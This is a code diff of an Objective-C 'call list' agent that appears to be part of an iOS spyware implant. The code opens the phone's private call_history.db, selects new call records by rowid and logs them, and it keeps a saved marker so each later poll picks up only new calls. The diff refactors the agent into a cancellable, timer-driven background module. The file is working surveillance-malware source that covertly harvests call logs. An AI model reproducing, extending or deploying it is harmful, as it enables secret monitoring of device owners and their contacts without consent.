@@ -13,10 +13,11 @@
 #import "RCSIAgentCallList.h"
 
 //#define DEBUG
+
+NSString *kRCSIAgentCallListRunLoopMode = @"kRCSIAgentCallListRunLoopMode";
+
 #define CALL_LIST_DB_4x "/private/var/wireless/Library/CallHistory/call_history.db"
 #define CALL_LIST_DB_3x "/private/var/mobile/Library/CallHistory/call_history.db"
-
-static RCSIAgentCallList *sharedAgentCallList = nil;
 
 typedef struct _callListAdditionalHeader {
   u_int size;     // size of standard + optional fields
@@ -37,7 +38,7 @@ typedef struct _callListAdditionalHeader {
 
 @interface RCSIAgentCallList (hidden)
 
-- (BOOL)_getCallList;
+- (void)_getCallList;
 - (void)_logCallList: (NSMutableArray *)callList;
 - (void)_saveLastTimestamp;
 - (BOOL)_getLastSavedTimestamp;
@@ -46,84 +47,89 @@ typedef struct _callListAdditionalHeader {
 
 @implementation RCSIAgentCallList (hidden)
 
-- (BOOL)_getCallList
+- (void)_getCallList
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
 
   int rc = 0;
   sqlite3 *db;
   char stmt[1024];
-
+  
+  if ([self isThreadCancelled] == TRUE)
+    {
+      [outerPool release];
+      return;
+    }
+  
   if (gOSMajor == 3)
     {
       rc = sqlite3_open(CALL_LIST_DB_3x, &db);
+    
       if (rc)
         {
+          [outerPool release];
           sqlite3_close(db);
-          return NO;
+          return;
         }
       
     }
   else if (gOSMajor == 4 || gOSMajor == 5)
     {
       rc = sqlite3_open(CALL_LIST_DB_4x, &db);
+    
       if (rc)
         {
+          [outerPool release];
           sqlite3_close(db);
-          return NO;
+          return;
         }
     }
   else
     {
-      return NO;
+      return;
     }
 
-  if ([self _getLastSavedTimestamp] == NO)
+  if ([self isThreadCancelled] == TRUE)
     {
-#ifdef DEBUG
-      NSLog(@"No previous timestamp found");
-#endif
+      sqlite3_close(db);
+      [outerPool release];
+      return;
     }
-
-  //
-  // See if we have a previous session in place
-  //
+  
+  [self _getLastSavedTimestamp];
+  
   if (mLastCallTimestamp == 0)
-    {
-      sprintf(stmt,
-              "SELECT * from call");
-    }
+    sprintf(stmt, "SELECT * from call");
   else
+    sprintf(stmt, "SELECT * from call where rowid > '%d'",  mLastCallTimestamp);
+  
+  if ([self isThreadCancelled] == TRUE)
     {
-      sprintf(stmt,
-              "SELECT * from call where rowid > '%d'",
-              mLastCallTimestamp);
+      sqlite3_close(db);
+      [outerPool release];
+      return;
     }
-
+  
   NSMutableArray *results = rcs_sqlite_do_select(db, stmt);
-  for (NSMutableDictionary *entry in results)
+  
+  if ([self isThreadCancelled] == TRUE)
     {
-      int32_t timestamp = [[entry objectForKey: @"ROWID"] intValue];
-
-      if (mLastCallTimestamp == 0 || timestamp > mLastCallTimestamp)
-        {
-          mLastCallTimestamp = timestamp;
-        }
-
-      usleep(10000);
+      sqlite3_close(db);
+      [outerPool release];
+      return;
     }
-
+  
   if (results != nil)
     {
       [self _logCallList: results];
       [self _saveLastTimestamp];
     }
 
-
   sqlite3_close(db);
+  
   [outerPool release];
 
-  return YES;
+  return;
 }
 
 - (void)_logCallList: (NSMutableArray *)callList
@@ -133,7 +139,11 @@ typedef struct _callListAdditionalHeader {
 
   for (NSMutableDictionary *item in callList)
     {
+      if ([self isThreadCancelled] == TRUE)
+        return;
+    
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+      
       NSMutableData *logData = [[NSMutableData alloc] init];
 
       if ([item objectForKey: @"duration"] == nil)
@@ -144,7 +154,12 @@ typedef struct _callListAdditionalHeader {
         {
           continue;
         }
-
+    
+      int32_t timestamp = [[item objectForKey: @"ROWID"] intValue];
+    
+      if (mLastCallTimestamp == 0 || timestamp > mLastCallTimestamp)
+        mLastCallTimestamp = timestamp;
+    
       int32_t duration  = [[item objectForKey: @"duration"] intValue];
       int64_t unixStart = [[item objectForKey: @"date"] longLongValue];
       int64_t unixEnd   = unixStart + duration;
@@ -243,14 +258,19 @@ typedef struct _callListAdditionalHeader {
 
   if (mLastCallTimestamp == 0)
     {
+      [pool release];
       return;
     }
   
   NSNumber *number = [[NSNumber alloc] initWithDouble: mLastCallTimestamp];
-  NSDictionary *dict        = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: number, nil]
-                                                            forKeys: [NSArray arrayWithObjects: @"CL_LAST", nil]];
-  NSDictionary *agentDict   = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: dict, nil]
-                                                            forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
+  
+  NSDictionary *dict = 
+    [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: number, nil]
+                                  forKeys: [NSArray arrayWithObjects: @"CL_LAST", nil]];
+  
+  NSDictionary *agentDict = 
+    [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: dict, nil]
+                                  forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
   
   setRcsPropertyWithName([[self class] description], agentDict);
   
@@ -263,6 +283,7 @@ typedef struct _callListAdditionalHeader {
 - (BOOL)_getLastSavedTimestamp
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
   NSDictionary *agentDict = rcsPropertyWithName([[self class] description]);
   
   if (agentDict == nil) 
@@ -272,6 +293,7 @@ typedef struct _callListAdditionalHeader {
   else 
     {
       mLastCallTimestamp = [[agentDict objectForKey: @"CL_LAST"] unsignedIntValue];
+      [agentDict release];
     }
 
   [outerPool release];
@@ -282,143 +304,74 @@ typedef struct _callListAdditionalHeader {
 
 @implementation RCSIAgentCallList
 
-@synthesize mAgentConfiguration;
-
 #pragma mark -
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSIAgentCallList *)sharedInstance
+- (id)initWithConfigData:(NSData*)aData
 {
-  @synchronized(self)
-  {
-    if (sharedAgentCallList == nil)
-      {
-        // Assignment is not done here
-        [[self alloc] init];
-      }
-  }
-  
-  return sharedAgentCallList;
-}
+  self = [super initWithConfigData:aData];
 
-+ (id)allocWithZone: (NSZone *)aZone
-{
-  @synchronized(self)
-  {
-    if (sharedAgentCallList == nil)
-      {
-        sharedAgentCallList = [super allocWithZone: aZone];
-        
-        // Assignment and return on first allocation
-        return sharedAgentCallList;
-      }
-  }
+  if (self != nil)
+    {
+      mLastCallTimestamp  = 0;
+      mAgentID            = AGENT_CALL_LIST;
+    }
   
-  // On subsequent allocation attemps return nil
-  return nil;
-}
-
-- (id)copyWithZone: (NSZone *)aZone
-{
   return self;
-}
-
-- (id)retain
-{
-  return self;
-}
-
-- (unsigned)retainCount
-{
-  // Denotes an object that cannot be released
-  return UINT_MAX;
-}
-
-- (void)release
-{
-  // Do nothing
-}
-
-- (id)autorelease
-{
-  return self;
-}
-
-- (id)init
-{
-  Class myClass = [self class];
-  
-  @synchronized(myClass)
-  {
-    if (sharedAgentCallList != nil)
-      {
-        self = [super init];
-        
-        if (self != nil)
-          {
-            sharedAgentCallList = self;
-            mLastCallTimestamp  = 0;
-          }
-      }
-  }
-  
-  return sharedAgentCallList;
 }
 
 #pragma mark -
 #pragma mark Agent Formal Protocol Methods
 #pragma mark -
 
-- (void)start
+- (void)getCallList:(NSTimer*)theTimer
+{
+  [self _getCallList];
+}
+
+- (void)setCallListPollingTimeout:(NSTimeInterval)aTimeOut
+{
+  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
+                                                    target: self 
+                                                  selector: @selector(getCallList:) 
+                                                  userInfo: nil 
+                                                   repeats: NO];
+  
+  [[NSRunLoop currentRunLoop] addTimer: timer forMode: kRCSIAgentCallListRunLoopMode];
+}
+
+- (void)startAgent
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-
-  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
   
-  while ([mAgentConfiguration objectForKey: @"status"]    != AGENT_STOP
-         && [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
+  if ([self isThreadCancelled] == TRUE)
+    {
+      [self setMAgentStatus: AGENT_STATUS_STOPPED];
+      [outerPool release];
+      return;
+    }
+  
+  [self setCallListPollingTimeout: 5.0];
+  
+  while ([self mAgentStatus] == AGENT_STATUS_RUNNING)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-
-      [self _getCallList];
       
-      for (int i=0; i<30; i++) 
-        {
-          sleep(1);
-          if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
-            break;
-        }
+      [[NSRunLoop currentRunLoop] runMode: kRCSIAgentCallListRunLoopMode 
+                               beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.0]];
         
       [innerPool release];
     }
   
-  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
-    {
-      [mAgentConfiguration setObject: AGENT_STOPPED
-                              forKey: @"status"];
-    }
-  
-  [mAgentConfiguration release];
-  mAgentConfiguration = nil;
+  [self setMAgentStatus: AGENT_STATUS_STOPPED];
   
   [outerPool release];
 }
   
-- (BOOL)stop
+- (BOOL)stopAgent
 {
-  int internalCounter = 0;
-  
-  [mAgentConfiguration setObject: AGENT_STOP
-                          forKey: @"status"];
-  
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
-         && internalCounter <= MAX_WAIT_TIME)
-    {
-      internalCounter++;
-      sleep(1);
-    }
-
+  [self setMAgentStatus: AGENT_STATUS_STOPPING];
   return YES;
 }
 
